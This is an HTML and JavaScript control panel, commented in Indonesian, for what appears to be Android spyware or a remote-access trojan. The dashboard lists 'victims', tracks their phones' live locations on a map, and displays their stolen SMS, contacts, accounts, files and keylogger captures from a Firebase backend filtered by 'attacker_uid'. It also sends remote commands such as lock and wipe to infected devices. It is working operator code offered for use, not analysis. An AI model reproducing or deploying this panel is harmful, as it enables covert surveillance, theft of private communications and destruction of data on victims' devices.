<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard • REU Panel</title>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
</head>
<body>
    <nav class="navbar">
        <div class="nav-brand">REU MONITOR</div>
        <div class="nav-menu">
            <a href="#" class="active">Dashboard</a>
            <a href="#" onclick="loadVictims()">Victims</a>
            <a href="#" onclick="loadCommands()">Commands</a>
            <a href="profile.html">Profile</a>
            <button onclick="logout()" class="btn-logout">Logout</button>
        </div>
    </nav>

    <div class="container">
        <div class="stats-grid">
            <div class="stat-card">
                <h3>Total Devices</h3>
                <p id="totalDevices">0</p>
            </div>
            <div class="stat-card">
                <h3>Online Now</h3>
                <p id="onlineDevices">0</p>
            </div>
            <div class="stat-card">
                <h3>Today's Data</h3>
                <p id="todayData">0 MB</p>
            </div>
        </div>

        <div class="main-grid">
            <div class="victims-list card">
                <h2>📱 Connected Devices</h2>
                <div id="victimsContainer"></div>
            </div>
            
            <div class="live-location card">
                <h2>📍 Live Locations</h2>
                <div id="map" style="height: 300px;"></div>
            </div>
        </div>

        <div class="data-panel card">
            <h2>📊 Real-time Data</h2>
            <div class="data-tabs">
                <button onclick="showData('sms')" class="tab-btn active">SMS</button>
                <button onclick="showData('calls')" class="tab-btn">Calls</button>
                <button onclick="showData('notif')" class="tab-btn">Notifications</button>
                <button onclick="showData('contacts')" class="tab-btn">Contacts</button>
                <button onclick="showData('accounts')" class="tab-btn">Accounts</button>
                <button onclick="showData('keylog')" class="tab-btn">Keylogger</button>
                <button onclick="showData('files')" class="tab-btn">Files</button>
            </div>
            <div id="dataContent" class="data-content"></div>
        </div>
    </div>

    <script src="firebase-config.js"></script>
    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const currentUid = urlParams.get('uid');
        
        // Cek apakah owner
        const OWNER_UID = 'OWNER_UID_MU'; // Ganti dengan UID firebasemu
        
        // Load victims
        function loadVictims() {
            const victimsRef = db.ref('victims/' + currentUid);
            victimsRef.on('value', (snapshot) => {
                const victims = snapshot.val() || {};
                document.getElementById('totalDevices').textContent = Object.keys(victims).length;
                
                let html = '';
                for (const [deviceId, data] of Object.entries(victims)) {
                    html += `
                        <div class="victim-item">
                            <div class="victim-header">
                                <span class="device-name">${data.info?.deviceName || 'Unknown'}</span>
                                <span class="status ${data.online ? 'online' : 'offline'}">${data.online ? '🟢 Online' : '⚫ Offline'}</span>
                            </div>
                            <div class="victim-details">
                                <p>📱 ${data.info?.model || 'N/A'} | ${data.info?.os || 'N/A'}</p>
                                <p>🔋 ${data.info?.battery || 'N/A'}% | ${data.info?.country || 'N/A'}</p>
                                <button onclick="viewDevice('${deviceId}')">View Details</button>
                                <button onclick="sendCommand('${deviceId}')">Send Command</button>
                            </div>
                        </div>
                    `;
                }
                document.getElementById('victimsContainer').innerHTML = html || '<p>No victims yet</p>';
            });
        }

        // Live location map
        let map;
        const markers = {};

        function initMap() {
            map = L.map('map').setView([-6.2088, 106.8456], 13);
            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                attribution: '© OpenStreetMap'
            }).addTo(map);

            // Subscribe ke lokasi semua victims
            const victimsRef = db.ref('victims/' + currentUid);
            victimsRef.on('child_added', (snapshot) => {
                const deviceId = snapshot.key;
                const locRef = db.ref(`devices/${deviceId}/location`);
                
                locRef.on('value', (locSnap) => {
                    const loc = locSnap.val();
                    if (loc && loc.lat && loc.lng) {
                        if (markers[deviceId]) {
                            markers[deviceId].setLatLng([loc.lat, loc.lng]);
                        } else {
                            markers[deviceId] = L.marker([loc.lat, loc.lng])
                                .bindPopup(`Device: ${deviceId}`)
                                .addTo(map);
                        }
                        map.setView([loc.lat, loc.lng], 15);
                    }
                });
            });
        }

        // Show different data types
        function showData(type) {
            const contentDiv = document.getElementById('dataContent');
            
            // Hapus class active dari semua tab
            document.querySelectorAll('.tab-btn').forEach(btn => {
                btn.classList.remove('active');
            });
            event.target.classList.add('active');

            // Load data berdasarkan tipe
            const dataRef = db.ref('devices').orderByChild('attacker_uid').equalTo(currentUid);
            
            dataRef.once('value', (snapshot) => {
                let html = '<table class="data-table">';
                
                snapshot.forEach((deviceSnap) => {
                    const deviceId = deviceSnap.key;
                    const deviceData = deviceSnap.val();
                    
                    if (deviceData[type]) {
                        Object.entries(deviceData[type]).forEach(([key, value]) => {
                            html += '<tr>';
                            if (type === 'sms') {
                                html += `<td>${value.from}</td><td>${value.body}</td><td>${value.date}</td>`;
                            } else if (type === 'location') {
                                html += `<td>${value.lat}, ${value.lng}</td><td>${value.accuracy}m</td><td>${value.time}</td>`;
                            } else if (type === 'keylog') {
                                html += `<td colspan="3">${value.text}</td>`;
                            }
                            html += '</tr>';
                        });
                    }
                });
                
                html += '</table>';
                contentDiv.innerHTML = html || '<p>No data available</p>';
            });
        }

        // Send command ke device
        function sendCommand(deviceId) {
            const command = prompt('Enter command (lock, wipe, location, screenshot, etc):');
            if (command) {
                const cmdRef = db.ref(`commands/${deviceId}`).push();
                cmdRef.set({
                    command: command,
                    timestamp: Date.now(),
                    status: 'pending'
                });
                alert('Command sent!');
            }
        }

        // Inisialisasi
        loadVictims();
        initMap();
    </script>
</body>
</html>
